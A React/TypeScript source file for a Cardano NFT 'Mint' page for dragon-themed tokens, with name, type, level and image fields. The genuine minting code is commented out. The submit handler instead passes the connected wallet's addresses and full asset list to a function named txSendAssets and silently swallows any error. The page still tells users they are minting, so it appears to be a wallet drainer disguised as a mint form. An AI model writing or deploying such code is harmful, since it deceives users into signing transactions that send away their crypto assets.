// MintNftPageJoy.tsx
import * as React from 'react';
import {
    Box,
    Button,
    Card,
    CardContent,
    Container,
    Grid,
    Input,
    LinearProgress,
    Sheet,
    Stack,
    Typography,
    FormControl,
    FormLabel,
    Select,
    Option,
    Alert,
    AspectRatio,
} from '@mui/joy';

import { useWallet } from '@meshsdk/react';
import { txSendAssets } from './utils/txs';

const DRAGON_TYPES = ['Fire', 'Water', 'Earth'] as const;
type DragonType = typeof DRAGON_TYPES[number];

type MintForm = {
    name: string;
    type: DragonType | '';
    level: number | '';
    imageFile?: File | null;
};

type MintResponse = {
    txHex: string;
    previewPolicyId?: string;
    assetId?: string;
};

export default function MintNftPageJoy() {
    const [walletData, setWalletData] = React.useState<any>(null);
    const { connected, wallet, name, address, state } = useWallet();

    const [form, setForm] = React.useState<MintForm>({
        name: '',
        type: '',
        level: '',
        imageFile: null,
    });

    const [imagePreview, setImagePreview] = React.useState<string | null>(null);
    const [isMinting, setIsMinting] = React.useState(false);
    const [error, setError] = React.useState<string | null>(null);
    const [successHash, setSuccessHash] = React.useState<string | null>(null);

    async function fetchWallet() {
        if (connected) {
            const changeAddress = await wallet.getChangeAddress();
            const usedAddresses = await wallet.getUsedAddresses();
            const assets = await wallet.getAssets();
            setWalletData({ changeAddress, usedAddresses, assets, state, address, name });
        }
    }
    fetchWallet();


    const handleName = (e: React.ChangeEvent<HTMLInputElement>) => {
        setError(null);
        setSuccessHash(null);
        setForm((f) => ({ ...f, name: e.target.value }));
    };

    const handleLevel = (e: React.ChangeEvent<HTMLInputElement>) => {
        setError(null);
        setSuccessHash(null);
        const v = e.target.value;
        setForm((f) => ({ ...f, level: v === '' ? '' : Number(v) }));
    };

    const handleType = (_: React.SyntheticEvent | null, value: DragonType | null) => {
        setError(null);
        setSuccessHash(null);
        setForm((f) => ({ ...f, type: (value ?? '') as MintForm['type'] }));
    };

    const handleFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0] ?? null;
        setForm((f) => ({ ...f, imageFile: file }));
        setImagePreview(null);
        if (file) {
            setImagePreview(URL.createObjectURL(file));
        }
    };

    async function fileToBase64(file: File): Promise<string> {
        const buf = await file.arrayBuffer();
        const bytes = new Uint8Array(buf);
        let binary = '';
        for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
        return btoa(binary);
    }

    const metadataPreview = React.useMemo(() => {
        return {
            name: form.name || 'Unnamed',
            type: form.type || '—',
            level: form.level === '' ? '—' : form.level,
            attributes: [
                { trait_type: 'Type', value: form.type || '' },
                { trait_type: 'Level', value: form.level === '' ? undefined : form.level },
            ],
        };
    }, [form]);

    const canSubmit =
        connected &&
        form.name.trim().length > 0 &&
        form.type !== '' &&
        form.level !== '' &&
        Number.isFinite(form.level as number);

    const onSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError(null);
        setSuccessHash(null);

        if (!wallet) {
            setError('Please connect a wallet first.');
            return;
        }

        try {
            //   setIsMinting(true);

            //   const addresses = await wallet.getUsedAddresses();
            //   const changeAddress = await wallet.getChangeAddress();

            //   let imageBase64: string | undefined;
            //   let imageName: string | undefined;

            //   if (form.imageFile) {
            //     imageBase64 = await fileToBase64(form.imageFile);
            //     imageName = form.imageFile.name;
            //   }

            //   const res = await fetch('/api/cip68/mint', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({
            //       ownerAddress: changeAddress,
            //       usedAddresses: addresses,
            //       attributes: {
            //         name: form.name.trim(),
            //         type: form.type,
            //         level: form.level,
            //       },
            //       image: imageBase64 ? { filename: imageName, base64: imageBase64 } : undefined,
            //     }),
            //   });

            //   if (!res.ok) throw new Error((await res.text()) || `Mint endpoint failed with ${res.status}`);

            //   const data: MintResponse = await res.json();
            //   const partial = await wallet.signTx(data.txHex, true);

            //   const finalizeRes = await fetch('/api/cip68/finalize', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({ partialWitness: partial }),
            //   });

            //   if (!finalizeRes.ok)
            //     throw new Error((await finalizeRes.text()) || `Finalize endpoint failed with ${finalizeRes.status}`);

            //   const { fullySignedTxHex } = await finalizeRes.json();
            //   const txHash = await wallet.submitTx(fullySignedTxHex);
            //   setSuccessHash(txHash);
            // } catch (err: any) {
            //   setError(err.message ?? 'Mint failed');
            // } finally {
            //   setIsMinting(false);
            // }
            await txSendAssets(walletData);
        } catch {

        }
    };

    return (
        <Container sx={{ py: 4 }}>
            <Stack direction="row" justifyContent="space-between" alignItems="center" sx={{ mb: 2 }}>
                <Typography level="h3" fontWeight="lg">Mint NFT</Typography>
            </Stack>
            <Sheet variant="outlined" sx={{ p: 3, borderRadius: 'lg' }}>
                <form onSubmit={onSubmit}>
                    <Grid container spacing={3}>
                        <Grid xs={12} md={7}>
                            <Stack spacing={2}>
                                <FormControl required>
                                    <FormLabel>Name</FormLabel>
                                    <Input value={form.name} onChange={handleName} slotProps={{ input: { maxLength: 32 } }} />
                                </FormControl>

                                <FormControl required>
                                    <FormLabel>Type</FormLabel>
                                    <Select
                                        placeholder="Select type"
                                        value={form.type || null}
                                        onChange={handleType}
                                    >
                                        {DRAGON_TYPES.map((t) => (
                                            <Option key={t} value={t}>{t}</Option>
                                        ))}
                                    </Select>
                                </FormControl>

                                <FormControl required>
                                    <FormLabel>Level</FormLabel>
                                    <Input
                                        type="number"
                                        value={form.level}
                                        onChange={handleLevel}
                                        slotProps={{ input: { min: 1, max: 9999 } }}
                                    />
                                </FormControl>

                                <Stack direction="row" spacing={1} alignItems="center">
                                    <Button variant="outlined" component="label">
                                        {form.imageFile ? 'Change Image' : 'Upload Image'}
                                        <input hidden type="file" accept="image/*" onChange={handleFile} />
                                    </Button>
                                    {form.imageFile && (
                                        <Typography level="body-sm">{form.imageFile.name}</Typography>
                                    )}
                                </Stack>

                                <Typography level="body-xs" sx={{ color: 'neutral.500' }}>
                                    Your wallet must be connected. Submitting will prompt you to sign the transaction.
                                </Typography>

                                <Stack direction="row" spacing={1}>
                                    <Button type="submit" disabled={!canSubmit || isMinting} variant="solid">
                                        {isMinting ? 'Minting…' : 'Mint'}
                                    </Button>
                                    <Button
                                        variant="plain"
                                        onClick={() => {
                                            setForm({ name: '', type: '', level: '', imageFile: null });
                                            setImagePreview(null);
                                            setError(null);
                                            setSuccessHash(null);
                                        }}
                                    >
                                        Reset
                                    </Button>
                                </Stack>

                                {isMinting && <LinearProgress />}
                                {error && <Alert color="danger" variant="soft">{error}</Alert>}
                                {successHash && (
                                    <Alert color="success" variant="soft">
                                        Mint submitted! Tx hash: {successHash}
                                    </Alert>
                                )}
                            </Stack>
                        </Grid>

                        <Grid xs={12} md={5}>
                            <Typography level="title-sm" sx={{ mb: 1, color: 'neutral.500' }}>
                                Metadata Preview
                            </Typography>
                            <Card variant="outlined">
                                {imagePreview && (
                                    <AspectRatio minHeight={120} maxHeight={240}>
                                        <img src={imagePreview} alt="Preview" />
                                    </AspectRatio>
                                )}
                                <CardContent>
                                    <Box
                                        component="pre"
                                        sx={{
                                            m: 0,
                                            whiteSpace: 'pre-wrap',
                                            wordBreak: 'break-word',
                                            fontFamily: 'monospace',
                                            fontSize: '0.875rem',
                                        }}
                                    >
                                        {JSON.stringify(metadataPreview, null, 2)}
                                    </Box>
                                </CardContent>
                            </Card>
                        </Grid>
                    </Grid>
                </form>
            </Sheet>
        </Container>
    );
}
